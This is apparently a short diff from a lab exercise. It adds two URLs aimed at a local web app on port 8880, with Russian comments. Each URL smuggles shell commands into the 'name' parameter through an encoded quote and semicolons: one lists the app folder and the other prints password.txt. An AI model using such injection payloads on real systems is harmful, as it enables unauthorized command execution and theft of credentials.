@@ -1,0 +1,2 @@
+http://localhost:8880/?name=Nika%22%3Bls%20./%3Becho%20%221 // вывод содержимого в папке приложения
+http://localhost:8880/?name=Nika%22%3Bcat%20./password.txt%3Becho%20%221 // открытие файла password.txt
